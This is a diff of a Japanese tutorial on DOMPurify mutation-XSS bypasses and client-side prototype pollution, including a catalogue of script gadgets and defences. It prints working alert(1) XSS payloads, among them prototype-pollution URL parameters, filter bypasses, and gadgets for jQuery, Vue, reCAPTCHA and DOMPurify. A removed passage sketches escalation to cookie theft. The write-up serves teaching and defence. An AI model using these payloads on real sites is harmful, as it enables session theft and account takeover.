@@ -396,6 +396,8 @@ fp170は、単発のブラウザバグの寄せ集めに見えた現象の背後
 - Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
 - Escaping '<' and '>' in attributes（Google Bug Hunters） — https://bughunters.google.com/blog/escaping-and-in-attributes-how-it-helps-protect-against-mutation-xss
 
+---
+
 ## DOMPurifyバイパス：MathML名前空間混同（CVE-2020-26870）
 
 このセクションでは、HTMLサニタイザー（入力HTMLから危険な要素・属性を除去して安全なHTMLに変換するライブラリ）のデファクトスタンダードである **DOMPurify** を、Michał Bentkowski（Securitum所属のセキュリティ研究者、Twitter/Xでは @SecurityMB）が2020年に破った手法を、原理のレベルまで掘り下げて解説する。この脆弱性は **CVE-2020-26870** として登録され、DOMPurify **2.0.17未満**の全バージョンが影響を受けた。
@@ -661,6 +663,8 @@ Bentkowskiは2013年よりSecuritumに所属し、Webおよびモバイルアプ
 - 修正は **`_checkValidNamespace`（PR #495、2020年12月17日マージ）**で、「各ノードを親の名前空間に照らして検証し、HTML名前空間の `mglyph` のような仕様違反要素を削除する」ことにより、変異の足場を除去した。`insertAdjacentHTML` への依存廃止も同時に行われ、serialize-reparseの不一致リスクを低減した。
 - 教訓は普遍的で、**サニタイザーはタグ名ではなく実際の名前空間で判断すべし**。そして名前空間混同は一度で終わらず、SVG版・MathML版と形を変えて繰り返し現れる「クラス」であるため、**ライブラリを最新に保ち、不要な外来コンテンツを許可しない**ことが実務上の要である。
 
+---
+
 ## 変異XSSによるDOMPurify再バイパス
 
 このセクションでは、HTMLサニタイザのデファクトスタンダードである **DOMPurify** に対して、**変異XSS（mutation XSS, mXSS）** を使って繰り返しバイパスが成立してきた歴史を、仕組みのレベルで解説する。特に次の2本の研究を中心に扱う。
@@ -881,6 +885,8 @@ Santosはこの脆弱性を **2020年11月2日**にCure53へ報告し（GitHub I
 > - DOMPurify 公式リポジトリおよび回帰テストフィクスチャ -- https://github.com/cure53/DOMPurify
 > - Attack Classes & Bypass History（cure53/DOMPurify Wiki） -- https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
 > - Mutation XSS via namespace confusion -- DOMPurify < 2.0.17 bypass（Michał Bentkowski, securitum） -- https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/
+
+---
 
 ## mXSS解説とチートシート（Sonar）
 
@@ -1382,6 +1388,8 @@ mXSS への対策は「サニタイザを信じきる」ことではなく、「
 - Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
 - Code Vulnerabilities Put Skiff Emails at Risk（Sonar） — https://www.sonarsource.com/blog/code-vulnerabilities-put-skiff-emails-at-risk
 
+---
+
 ## mXSS補足: XMLパーサ差分によるDOMPurifyバイパス
 
 本節では、前節までに学んだmXSS（Mutation XSS）の原理を踏まえ、**HTMLパーサとXMLパーサの構文解釈の違い**を突いたDOMPurifyバイパスの実例を深掘りする。主題となるのは、Flatt Security（現 GMO Flatt Security）のセキュリティエンジニアRyotaK氏が2024年4月に公開した研究「Bypassing DOMPurify with good old XML」である。この研究は、DOMPurifyの**XMLパースモード**において、Processing Instruction（処理命令）とCDATAセクションという2つのXML固有構文がmXSSベクタとなることを実証し、2段階にわたるバイパスと修正の攻防を記録した貴重な事例である。
@@ -1638,1173 +1646,2748 @@ mXSSの影響は「Webページ上でJavaScriptが実行される」ことにと
 
 > 出典: RyotaK, "Bypassing DOMPurify with good old XML"（Flatt Security, 2024年4月） — https://flatt.tech/research/posts/bypassing-dompurify-with-good-old-xml/
 
+---
+
 ## プロトタイプ汚染 概説とガジェット集
 
-反射型XSSやDOMベースXSSの基本を押さえた読者にとって、次に理解しておくべき攻撃手法が「プロトタイプ汚染（Prototype Pollution）」です。プロトタイプ汚染そのものは直接コードを実行する脆弱性ではありませんが、「script gadget（スクリプトガジェット）」と呼ばれる既存コードパターンと組み合わさることで、深刻なXSSへとエスカレーションします。本節では、プロトタイプ汚染の仕組みそのものから、実際に悪用可能なガジェットの具体例までを体系的に解説します。
+反射型XSSやDOMベースXSSに慣れた読者でも、「プロトタイプ汚染（Prototype Pollution）」という言葉には身構えるかもしれません。しかし仕組み自体はシンプルです。本節では、JavaScriptのオブジェクトモデルという「土台」を汚す攻撃がなぜXSSに直結するのかを、プロトタイプチェーンの仕組みから丁寧に説明し、実際に悪用可能な「ガジェット」の具体例まで見ていきます。
 
-### 1. プロトタイプ汚染とは何か
+### プロトタイプチェーンの基礎
 
-JavaScriptでは、すべてのオブジェクトは「プロトタイプ（prototype）」と呼ばれる別オブジェクトへの隠れた参照を持っており、あるオブジェクトにプロパティが存在しない場合、JavaScriptエンジンはこのプロトタイプ参照をたどってプロパティを探しにいきます。これを「プロトタイプチェーン」と呼びます。すべてのプレーンオブジェクト（`{}` で作られるようなオブジェクト）は、最終的に `Object.prototype` という共通の大元のプロトタイプに行き着きます。
-
-**プロトタイプ汚染**とは、この `Object.prototype`（あるいは特定クラスのプロトタイプ）に、攻撃者が意図しないプロパティを外部から追加・上書きしてしまう脆弱性です。`Object.prototype` は事実上「アプリケーション内の全てのプレーンオブジェクトの共通の親」であるため、ここを汚染すると、汚染箇所とは全く無関係に見えるコード――例えば別のライブラリの内部処理――が汚染されたプロパティを「継承」してしまい、予期しない値を読み取ってしまいます。
+JavaScriptのオブジェクトは、自分がプロパティを持っていなくても、`__proto__`という内部リンクをたどって「親」のオブジェクトのプロパティを参照できます。この親をたどる連鎖を**プロトタイプチェーン**と呼びます。
 
 ```js
-// 脆弱なマージ処理の例（再帰的にオブジェクトをマージする関数）
+const obj = {};
+console.log(obj.toString); // 関数が返る
+```
+
+`obj`自体は`toString`を持っていませんが、`obj.__proto__`（すなわち`Object.prototype`）が持っているため、参照が「通って」しまいます。ここが攻撃の核心です。**すべての通常オブジェクトは最終的に`Object.prototype`にたどり着く**ため、もし攻撃者が`Object.prototype`に任意のプロパティを追加できれば、そのアプリケーション内の「あらゆるオブジェクト」が、書いた覚えのないプロパティを持っているように見えてしまいます。
+
+```js
+Object.prototype.isAdmin = true;
+const user = {};
+console.log(user.isAdmin); // true ← userには一切代入していないのに
+```
+
+これが「汚染（Pollution）」です。攻撃者が直接`Object.prototype.isAdmin = true`と書けるわけではありませんが、アプリケーションが持つ「オブジェクトのマージ処理」や「ネストしたキーの動的代入処理」に、ユーザー入力由来の`__proto__`というキーを紛れ込ませることで、間接的に同じ効果を得られます。
+
+```js
 function merge(target, source) {
-  for (let key in source) {
+  for (const key in source) {
     if (typeof source[key] === 'object') {
-      if (!target[key]) target[key] = {};
-      merge(target[key], source[key]); // key に "__proto__" が来ると危険
+      if (target[key] === undefined) target[key] = {};
+      merge(target[key], source[key]); // 再帰的に潜っていく
     } else {
       target[key] = source[key];
     }
   }
-  return target;
 }
 
 merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
-
-console.log({}.isAdmin); // true ← 何もしていない全く別のオブジェクトが汚染されている
+// → Object.prototype.isAdmin = true になってしまう
 ```
 
-なぜこれが動くのでしょうか。`source` のキーが `"__proto__"` という文字列だった場合、多くの実行環境では `target["__proto__"]` へのプロパティアクセス（代入）が、そのオブジェクト自身に `__proto__` という名前のプロパティを作るのではなく、**そのオブジェクトの内部的な `[[Prototype]]` を書き換えるアクセサとして解釈されます**（`Object.prototype.__proto__` は getter/setter として定義されているため）。つまり `target.__proto__.isAdmin = true` は「`target` のプロトタイプ（多くの場合 `Object.prototype` そのもの）に `isAdmin` プロパティを生やせ」という意味になり、以後アプリケーション内で作られる**あらゆる**プレーンオブジェクトが、自分自身には定義していない `isAdmin` プロパティを継承して持つようになります。これが「オブジェクトのキー処理の再帰マージ」がプロトタイプ汚染の典型的な原因になる理由です。
+この`merge`関数は、キーが`__proto__`であることを一切特別扱いしていません。`target["__proto__"]`という書き方は、実際には新しいプロパティを作るのではなく、`target`のプロトタイプ（＝多くの場合`Object.prototype`そのもの）を指してしまうため、再帰の奥で`target[key][innerKey] = value`のような代入が発生した瞬間に、意図せず`Object.prototype`が書き換わります。ライブラリの深いマージ（deep merge）、クエリパラメータのネストしたパース（`a[b][c]=1`のような文字列を`{a:{b:{c:1}}}`に変換する処理）、あるいはJSONのクローン処理などが典型的な発生源です。
 
-同様の効果は `constructor.prototype` という経路からも得られます。すべてのオブジェクトは `constructor` プロパティ経由で自分を生成したコンストラクタ関数（例えば `Object`）にアクセスでき、コンストラクタは `prototype` プロパティ経由で共有プロトタイプにアクセスできます。したがって `obj["constructor"]["prototype"]["isAdmin"] = true` も `__proto__` と同じ結果になります。`__proto__` という文字列だけをブラックリストでフィルタしても `constructor.prototype` 経由の迂回を防げない、という点が防御の落とし穴としてよく挙げられます。
+### なぜクライアントサイドで危険なのか
 
-### 2. クライアントサイドでの汚染経路
+サーバーサイド（Node.jsなど）でプロトタイプ汚染が起きると、RCEやSQLインジェクションなど直接的な被害に繋がることがありますが、本章の主題であるXSSとの関係で重要なのは**クライアントサイド・プロトタイプ汚染（Client-Side Prototype Pollution, CSPP）**です。ブラウザ上のJavaScriptで`Object.prototype`が汚染されても、それ自体はコードを実行しません。攻撃が成立するには、汚染後のプロパティ値を`innerHTML`や`eval`、`<script src>`のようなDOM XSSのシンク（sink）に流し込む「橋渡し役」のコードが必要です。これを**ガジェット（gadget）**と呼びます。
 
-サーバーサイド（Node.jsのJSONマージ処理など）でのプロトタイプ汚染も重要ですが、本節ではXSSに直結する「クライアントサイド・プロトタイプ汚染」に焦点を当てます。クライアントサイドでの典型的な汚染源は、URLのクエリ文字列やハッシュフラグメントをオブジェクトに変換する処理（パーサ）です。
+つまりクライアントサイドのプロトタイプ汚染によるXSSは、次の2段階で成立します。
 
-```
-https://example.com/?__proto__[test]=test
-https://example.com/#__proto__[test]=test
-https://example.com/?constructor[prototype][test]=test
-```
+1. **汚染フェーズ**: URLのクエリパラメータやフラグメント（`#`以降）などユーザーが制御できる入力から、脆弱なパーサ/マージ処理を通じて`Object.prototype`に狙ったプロパティを注入する。
+2. **ガジェットフェーズ**: アプリケーションやライブラリの中に、その汚染されたプロパティを読み取ってDOMに書き込む、あるいはコードとして実行するコードパスが存在し、それが実際に実行される。
 
-多くのJavaScriptライブラリは、`location.search` や `location.hash` を読み取り、`a[b]=c` のようなブラケット記法をネストしたオブジェクトへ変換する独自パーサを実装しています。この変換処理が `__proto__` や `constructor` というキー名を特別扱いせずに再帰的にオブジェクトへ代入してしまうと、URLパラメータを操作するだけで `Object.prototype` を汚染できてしまいます。攻撃者はサーバーへのリクエストを一切必要とせず、被害者にリンクをクリックさせるだけで攻撃を成立させられる点が特徴です。
+汚染だけではXSSにならず、ガジェットだけでも汚染源がなければ攻撃者は起点を作れません。この両方が揃って初めて悪用可能な脆弱性になる、という点が本節のもう一つの柱です。
 
-### 3. 汚染だけでは攻撃にならない：ガジェットの必要性
+### s1r1us: Prototype Pollution が明らかにした実態
 
-ここで重要な原理があります。プロトタイプ汚染は「任意のプロパティ値を全オブジェクトに継承させられる」という状態を作るだけであり、それ自体はコード実行を意味しません。攻撃が成立するには、**汚染したプロパティを、危険な形で参照・利用してくれる既存のコードパス**が必要です。これを「script gadget（スクリプトガジェット）」と呼びます。
+s1r1us（および共同研究者）による調査記事では、大規模なインターネットスキャンを通じてプロトタイプ汚染の実態を定量的に示しています。彼らは**18個の脆弱なライブラリを発見し、約80件のバグを報告**し、さらに**1000以上の脆弱サイト**を確認したとしています（ただし悪用可能なガジェットが見つからなかったものは報告に至っていない、と述べられています）。
 
-ガジェットの探索は、静的にコードを読むか、動的にプロトタイプの各プロパティを次々汚染しながらDOM変化を観察するファジングによって行われます。ガジェットが成立する条件は概ね次の3点です。
+記事が指摘する重要な知見の一つは、「**ネストされたクエリパラメータパーサーの約80%がプロトタイプ汚染に脆弱**」という調査結果です。`canjs-deparam`のような、`?a[b][c]=1`形式のクエリ文字列をネストしたオブジェクトへ変換するライブラリの多くが、キーの検証を行わずに再帰的な代入を行っていたため、`__proto__`というキーをそのまま通してしまっていました。
 
-1. アプリケーションが `obj.someProperty` のように、あるオブジェクトのプロパティを読み取る際、そのオブジェクト自身が `someProperty` を持っているかを `hasOwnProperty` などで厳密にチェックしていない（プロトタイプチェーンをたどって値を拾ってしまう）。
-2. 読み取られた値が、`innerHTML` への代入、`eval`、`<script src>` の生成、DOM要素の属性設定など、最終的にHTML/JSとして解釈される sink（入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`）に渡される。
-3. 攻撃者がそのプロパティ名をURLなどから制御できる。
-
-### 4. 代表的なクライアントサイドガジェット集
-
-以下は、実際に発見・報告された著名なライブラリのガジェットです。いずれも「プロトタイプ汚染＋既存コード」の組み合わせでXSSに到達する仕組みを示しています。
-
-#### 4.1 jQuery系ガジェット
+汚染の基本パターンとして、記事では次のようなペイロードが示されています。
 
 ```
-?__proto__[context]=<img/src/onerror=alert(1)>&__proto__[jquery]=x
+x[__proto__][abaeead]=abaeead
+x.__proto__.edcbcab=edcbcab
+__proto__[eedffcb]=eedffcb
+__proto__.baaebfc=baaebfc
 ```
-jQueryの内部初期化処理は、`this.context` のようなプロパティが自身に存在しない場合、プロトタイプに存在する値を読み取ってDOM要素構築のコンテキストとして利用することがあります。汚染した `context` に不正なHTML文字列を仕込むことで、jQueryが内部でその文字列をHTMLとして解釈し、`onerror` ハンドラのJavaScriptが実行されます。
+
+これらはいずれも「ランダムな一意のプロパティ名を汚染してみて、実際にオブジェクトに現れるかどうかを確認する」ための検証用ペイロードです（ランダム文字列を使うのは、既存のプロパティ名との衝突による偽陽性を避けるためです）。
+
+実際に本番サービスで確認されたペイロード例として、記事はApple.com（`canjs-deparam`を使用）に対する次のURLを挙げています。
+
+```
+?__proto__[src]=image&__proto__[onerror]=alert(1)
+```
+
+これは、ページ内のどこかで汚染された`src`・`onerror`プロパティが画像要素などの属性として使われるガジェットが存在した場合に、`<img src=image onerror=alert(1)>`相当の状態を作り出すというものです。同様に、Jira Service Managementに対しては次のパターンが紹介されています。
+
+```
+?__proto__.isFresh=xxx&__proto__.onmousemove=alert(1)//
+```
+
+さらに興味深いのは、開発側が`__proto__`という文字列だけを単純にフィルタリングして「修正」した場合の回避策です。フィルタが`__proto__`という完全一致・部分一致だけを見ている場合、`constructor.prototype`という別の経路からでも同じ`Object.prototype`に到達できます。
+
+```
+?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
+```
+
+これは、任意のオブジェクトの`constructor`プロパティがそのオブジェクトを作った関数（多くの場合`Object`）を指しており、さらに関数の`prototype`プロパティがその関数で作られたインスタンス全体に共有されるプロトタイプオブジェクト、すなわち通常は`Object.prototype`そのものを指すためです。`__proto__`という文字列を持つキーだけをブロックする防御は、この`constructor.prototype`経由の迂回に対して無力です。
+
+Jiraの初期修正に対しては、`__pro[]to__.div=1`のように、文字列比較を狂わせるための文字の混入によるバイパスも報告されています。またHubSpotに対する修正バイパスとして、`__proto__=&0[taint]=polluted`という、キーの解析順序や空文字列の扱いの隙を突いたパターンも紹介されています（記事はこれをNikita Stupin氏による発見として紹介しています）。
+
+#### スクリプトガジェットの具体例
+
+汚染そのものだけでなく、汚染された値を実際にDOM操作へ流し込む「ガジェット」側の実例も紹介されています。jQueryの内部実装では、イベント処理に関連する`handleObj.delegateTarget`のようなプロパティが十分な検証なしに扱われるケースがあり、次のようなコードパターンが引用されています。
+
+```js
+if (types && types.preventDefault && types.handleObj) {
+    handleObj = types.handleObj;
+    jQuery(types.delegateTarget).off(...)
+}
+```
+
+このように、ライブラリ内部で「このオブジェクトはこういう形をしているはずだ」という暗黙の前提のもとにプロパティへアクセスしているコードは、`Object.prototype`が汚染されると前提が崩れ、想定外の値が流れ込む入り口になります。同様にSwiftType Searchのライブラリでは、汚染されたプロパティ値がそのまま`eval(hookFunction)`として実行されてしまう構造が指摘されています。`eval`は文字列をJavaScriptコードとして実行する関数であり、その引数が外部から汚染可能な値である時点でコード実行のガジェットとして機能します。
+
+#### 検出手法とツール
+
+記事では、大規模に脆弱なサイトを発見するための手法もいくつか紹介されています。
+
+- **Seleniumベースの自動巡回ボット**によるサブドメインの一括スキャン
+- **Chrome拡張機能（PPScan）**を使った、ログイン後のページなど認証が必要なエンドポイントの検査
+- **CodeQL**によるJavaScriptコードの静的解析での脆弱パターン検出
+- **`Object.defineProperty`のセッター（setter）をトラップとして仕込む**手法。これは、疑わしいプロパティに書き込みが発生した瞬間に検知できるようにする、いわば「動的な監視カメラ」です
+- Filedescriptorによる**untrusted-types拡張機能**を使い、実際にどのDOM APIのシンクに汚染データが到達するかをログとして記録する手法
+
+これらは後述するBurp Suiteの**DOM Invader**（本章の別セクションで扱う汚染追跡機能）とも同じ発想、すなわち「怪しいプロパティへの書き込み・読み出しをフックして流れを可視化する」というアプローチです。
+
+#### 防御策
+
+記事が挙げる防御策は次の通りです。
+
+1. **キーのブラックリスト/検証**: オブジェクトへの動的代入を行う前に、キーが`__proto__`・`prototype`・`constructor`を含んでいないかを確認して拒否する。
+2. **Node.jsのランタイムオプション**: `--disable-proto`フラグを付けて起動すると、`Object.prototype.__proto__`アクセサ自体を無効化できる。
+3. **将来的な仕様**: `Object.freeze(Object.prototype)`を強制するための**Document Policy**のような、ブラウザ側の宣言的な防御の議論が進んでいる（凍結されたオブジェクトはプロパティの追加・変更ができなくなる）。
+
+これらはいずれも「汚染フェーズ」を断つ対策です。加えて、汚染フェーズを完全に防げなくても、`Object.create(null)`で作った「プロトタイプを持たないオブジェクト」を辞書的な用途に使う、あるいは`Map`型（プロトタイプ経由の継承を持たないキー・バリューストア）を使うといった設計変更も、実務上有効な緩和策として広く知られています。
+
+> 出典: s1r1us: Prototype Pollution — https://blog.s1r1us.ninja/research/PP
+
+### BlackFan: client-side-prototype-pollution ガジェット集
+
+汚染フェーズの手口が分かっても、実際に悪用するには「そのプロパティを読んでDOMに書き込むコード」＝ガジェットが必要です。BlackFan氏が公開しているリポジトリ`client-side-prototype-pollution`は、実世界の著名なJavaScriptライブラリの中から見つかったガジェットを、ライブラリ別・脆弱性別に整理したカタログです。構成は大きく次の2つに分かれています。
+
+- **`pp/`**: プロトタイプ汚染そのものを引き起こせる脆弱なライブラリ（パーサやマージ関数など、汚染フェーズを担当する側）の一覧
+- **`gadgets/`**: 汚染された値を実際にXSS等の実行に変換するガジェット（実行フェーズを担当する側）の一覧
+
+汚染フェーズ側の代表例として、リポジトリでは複数のjQueryプラグインやユーティリティにCVE番号付きで脆弱性が記録されています。
+
+| ライブラリ | ペイロード例 | CVE |
+|---|---|---|
+| jQuery query-object | `?__proto__[test]=test` | CVE-2021-20083 |
+| jQuery Sparkle | `?__proto__.test=test` | CVE-2021-20084 |
+| backbone-query-parameters | `?__proto__.test=test` | CVE-2021-20085 |
+| jQuery BBQ | `?__proto__[test]=test` | CVE-2021-20086 |
+| jquery-deparam | `?__proto__[test]=test` | CVE-2021-20087 |
+| MooTools More | `?__proto__[test]=test` | CVE-2021-20088 |
+| Purl | `?__proto__[test]=test` | CVE-2021-20089 |
+
+これらはいずれも、URLのクエリ文字列やハッシュフラグメントを「ネストしたオブジェクト」にパースするユーティリティで、キー名に対する検証（`__proto__`や`constructor`の除外）が欠けていたために2021年前後に相次いでCVE番号が割り当てられました。攻撃者から見ると、これらのライブラリがページ内で読み込まれているかどうかを確認するだけで、汚染フェーズの手段が一つ確保できることになります。
+
+実行フェーズ、すなわちガジェット側の具体例としては、次のようなものが紹介されています。
+
+**jQuery `$.get`（3.0.0以降）を使ったガジェット:**
 
 ```
 ?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
 ```
-jQuery 3.0.0以降の `$.get()` 内部処理では、明示的に渡されなかった `url` や `dataType` の値をオプションオブジェクトのプロトタイプから継承して読み取ります。`dataType` を `"script"` に汚染すると、取得したレスポンスを `<script>` として実行させる分岐に強制的に入り、`data:` スキームURLを介して任意コードが実行されます。
 
-#### 4.2 HTMLサニタイザのバイパス
+これは、Ajax呼び出しのオプションを解決する内部処理が、明示的に指定されていない`dataType`（レスポンスの解釈方法）などのオプションを、汚染された`Object.prototype`から拾ってしまうことを利用しています。`dataType`を`script`に固定されると、取得したレスポンス本体（ここでは`data:`スキームでインラインに埋め込んだ`alert(1)`）がスクリプトとして評価されてしまいます。
 
-サニタイザ（危険なタグ・属性を除去してHTMLを「無害化」するライブラリ）自体はXSS対策として使われますが、その設定値がプロトタイプ汚染で書き換え可能な設計になっていると、対策そのものが無効化されます。
+**Google reCAPTCHA読み込み時のガジェット:**
 
 ```
-// DOMPurify <= 2.0.12
+?__proto__[srcdoc][]=<script>alert(1)</script>
+```
+
+`srcdoc`は`<iframe>`要素にインラインでHTMLを与えるための属性です。汚染された`srcdoc`プロパティがそのままiframeの初期HTMLとして使われてしまうと、`<script>`タグを含む任意のHTMLがそのiframeのコンテキストで解釈・実行されます。
+
+**Vue.jsのテンプレートエンジンを使ったガジェット:**
+
+```
+?__proto__[template]=<script>alert(1)</script>
+```
+
+Vue.jsのようなテンプレートエンジンでは、コンポーネントの`template`オプションが直接HTMLとしてコンパイル・レンダリングされます。もし何らかの初期化コードが、明示的に渡されなかった場合の`template`のデフォルト値をオブジェクトのプロパティ探索（＝プロトタイプチェーンをたどる探索を含む）で解決しているなら、汚染された`template`プロパティがそのままレンダリングされ、DOM XSSに直結します。
+
+**DOMPurify（2.0.12以前）に対するガジェット:**
+
+```
 ?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src
 ```
-DOMPurifyは許可する属性のホワイトリストをオプションオブジェクトから読み込みますが、呼び出し側が明示的に `ALLOWED_ATTR` を渡していない場合、内部でデフォルト値とオプションオブジェクトをマージする際にプロトタイプ由来の値を採用してしまう実装がありました（2020年頃に修正）。これにより、本来除去されるはずの `onerror` 属性がホワイトリストに追加され、サニタイズ後もペイロードが生き残ります。
 
-```
-// sanitize-html
-?__proto__[*][]=onload
-```
-ワイルドカード（`*`）キーで全タグに対する許可属性を追加できてしまう設計を突いた例で、`onload` のようなイベントハンドラ属性を全タグで許可させます。
+DOMPurifyはHTMLをサニタイズ（無害化）するためのライブラリで、許可する属性のホワイトリストを`ALLOWED_ATTR`という設定オブジェクトで管理しています。この設定がユーザー設定とデフォルト設定のマージによって組み立てられる実装だった場合、`Object.prototype.ALLOWED_ATTR`を汚染することで、サニタイザー自身の許可リストに`onerror`や`src`のような危険な属性を追加させることができます。これは「サニタイザーを迂回する」のではなく「サニタイザーの設定そのものを書き換えて無害化の基準を緩める」という、プロトタイプ汚染に特有の攻撃パターンです。DOMPurifyはこの種の設定汚染に対応するため、以降のバージョンで設定のマージ処理を強化しています。
 
-これらはいずれも「防御機構自身の設定がプロトタイプチェーン経由で書き換え可能」という、防御実装の落とし穴を示す重要な事例です。**サニタイザのオプション読み込みロジックには常に `Object.create(null)` ベースの安全なデフォルトオブジェクトを使うべき**、という教訓が得られます。
+これらのガジェットに共通する原理は、いずれも「オプション（設定）オブジェクトの未指定プロパティを、暗黙のうちにプロトタイプチェーン経由のデフォルト値として扱ってしまうコード」です。JavaScriptでは、関数の引数として渡されたオプションオブジェクトに特定のキーが存在しない場合、`options.someFlag`のような参照はプロトタイプチェーンをたどって`undefined`ではない値を返すことがあり、ライブラリの実装者がこれを意図していなくても攻撃者が意図的に用意した値を「デフォルト値のように見せかけて」注入できてしまいます。
 
-#### 4.3 フレームワーク（Vue.js）のガジェット
+リポジトリのREADMEでは、これらのガジェットカタログはペネトレーションテストや脆弱性調査における参考資料として位置づけられており、各エントリにはファイルパス付きで脆弱なコード箇所への言及が整理されています。汚染フェーズのCVE群と実行フェーズのガジェット群を突き合わせることで、「あるページでどのライブラリが読み込まれているか」から「悪用可能かどうか」を素早く判断できるようにする、辞書的なリファレンスとしての性格が強いリポジトリです。
 
-```
-?__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()
-```
-Vue.jsのテンプレートコンパイル・レンダリング処理の中には、コンポーネントのオプションが未指定の場合にプロトタイプ由来のプロパティを参照してしまう箇所があり、汚染した属性値の中に文字列から関数オブジェクトを生成する `''.constructor.constructor(...)`（`Function` コンストラクタを介した動的コード生成の定石）を仕込むことで、テンプレート評価時に任意コードが実行されます。
+> 出典: BlackFan: PPガジェット集 — https://github.com/BlackFan/client-side-prototype-pollution
 
-#### 4.4 解析系・トラッキング系タグのガジェット
+### まとめ：汚染とガジェットの二段構え
 
-```
-// Google Tag Manager 系
-?__proto__[srcdoc]=<script>alert(1)</script>
-```
-`iframe.srcdoc` に代入された文字列は、その `iframe` 内で通常のHTMLドキュメントとして解釈・実行されます。タグ生成ロジックが `srcdoc` オプションを未指定時にプロトタイプから継承してしまうと、攻撃者が注入したHTML/JSがiframe内で実行されます。
-
-### 5. これらの事例が示す「原理」のまとめ
-
-上記の多様なガジェットに共通する原理は次の通りです。
-
-- **信頼境界の消失**：本来「このオブジェクトに書き込んだ値だけを信頼する」という前提でコードが書かれていても、`in` 演算子や `for...in` ループ、あるいは単純な `obj.prop` 参照はプロトタイプチェーンを区別しません。`obj.hasOwnProperty('prop')` を使わない限り、そのオブジェクト自身が持つ値なのか、遥か上流の `Object.prototype` から継承しているだけの値なのかをコードは区別できません。
-- **設定のデフォルト値パターンの危険性**：`const opts = Object.assign({}, defaults, userOptions)` のようなマージパターンや、「未指定ならプロトタイプの値にフォールバック」という一見自然な設計が、汚染された `Object.prototype` を「グローバルなデフォルト値ストア」として悪用可能にしてしまいます。
-- **sinkへの到達**：汚染だけでは無害であり、`innerHTML`、`document.write`、`eval`、動的 `<script>` 生成などの危険なsinkに汚染値が流れ込む経路（ガジェット）が揃って初めてXSSが成立します。
-
-### 6. 防御策
-
-1. **パース処理でのキーフィルタリング**：URLやJSONを再帰的にオブジェクト化する自作パーサでは、`__proto__`・`constructor`・`prototype` というキー名を明示的に拒否する。ブラックリストは迂回されやすいため、可能であれば `Object.create(null)` で作った「プロトタイプを持たない」オブジェクトに結果を格納する。
-2. **`Object.freeze(Object.prototype)`**：アプリケーション起動時に組み込んでおくと、以後の汚染の書き込み自体をエラーにできる（ただし副作用の検証が必要）。
-3. **`hasOwnProperty` の徹底**：プロパティ参照時に、そのオブジェクト自身が値を持っているかを厳密にチェックするコーディング規約を徹底する。
-4. **サードパーティライブラリのバージョン管理**：jQuery、DOMPurify、Lodashなど過去にプロトタイプ汚染関連の脆弱性（例: CVE-2021-20083〜20089など複数のCVEが割り当てられている）が報告されたライブラリは、修正済みバージョンへの追随を継続する。
-5. **CSP（Content-Security-Policy）は保険であって根本対策ではない**：ガジェットが `eval` 系やインラインイベントハンドラを経由する場合、厳格なCSPが被害を軽減することがあるが、`srcdoc` や `data:` スキームを使った経路など、CSPの適用範囲外・許可設定の解釈次第で回避されるケースもあるため過信は禁物。
-
-### 7. 参考資料
-
-BlackFanのリポジトリは、上記のようなクライアントサイドプロトタイプ汚染ガジェットを継続的に収集・カタログ化したものです。2020年前後に多数のjQueryプラグイン、Web解析タグ、UIライブラリのガジェットが報告され、Wistia、Swiftype、HubSpot、Mutiny、Twitter Universal Website Tag、hCaptchaなど実際のサービスで修正が行われました。この分野の探索・報告に関わった研究者（Sergey Bobrov、Masato Kinugawaなど）による発見の蓄積が、現在のガジェットカタログの土台になっています。
-
-> 出典: client-side-prototype-pollution — https://github.com/BlackFan/client-side-prototype-pollution
-
-s1r1usのブログ記事は、脆弱性報奨金制度（VDP: Vulnerability Disclosure Program）を対象に大規模にプロトタイプ汚染をハントした実践研究で、独自ツールを用いて1,000件を超えるサイトで汚染可能な箇所を発見し、その中からガジェットが存在し実際に金銭的報奨につながった1件のケーススタディ（自己XSSからアカウント乗っ取りへのエスカレーション、SAMLログインを利用したセッション奪取を含む）を詳細に解説しています。最終的にこの案件は4,000ドルの報奨金を獲得したと報告されています。この記事は「汚染は見つかるがガジェットが見つからない」「見つかったガジェットの影響を最大化する（自己XSSからアカウント乗っ取りへ格上げする）」という、実際のバグバウンティにおける典型的な壁とその突破方法を示す点で価値があります。
-
-> ⚠️ **未取得の資料**: 「s1r1us: Prototype Pollution 大規模ハント研究」（https://blog.s1r1us.ninja/research/PP）は自動取得できませんでした（理由: 本環境のegressプロキシによりドメインがブロックされているため）。詳細な技術内容（使用した検出ツールの実装詳細、具体的なガジェット発見コード、エスカレーション手順の全ステップ）については、以下のURLからユーザーご自身で直接ご覧ください: https://blog.s1r1us.ninja/research/PP
->
-> （以下は未取得資料の補足として一般知識に基づく解説です）本記事のような大規模ハント手法は、一般に (1) 対象サイトのURLに `?__proto__[polluted]=true` のようなプローブパラメータを付与して自動巡回する、(2) ページ読み込み後に `window.polluted` あるいは `Object.prototype.polluted` の値をヘッドレスブラウザで検査し汚染の成否を機械的に判定する、(3) 汚染に成功したサイトについてのみ、次に既知のガジェットパターン（本節4章で挙げたようなjQuery/Vue/サニタイザ系のパターン）を順番に試し、DOM変化やアラート発火を検知する、という3段階のパイプラインで構成されるのが一般的です。自己XSSをアカウント乗っ取りに格上げする際の常套手段は、汚染したページを攻撃者が用意した非表示のiframeやポップアップウィンドウとして被害者に開かせ、被害者のセッションで実行されたJavaScriptからCookieやトークン、あるいはpostMessage経由でDOM内の機密情報を窃取する、というものです。SAML SSOのようなシングルサインオン導線がある場合、ログイン後にリダイレクトされる先のページで汚染とガジェットを発火させることで、通常は直接アクセスできない社内システムや管理画面のコンテキストでコードを実行できることがあり、報奨金額が跳ね上がる典型パターンとして知られています。
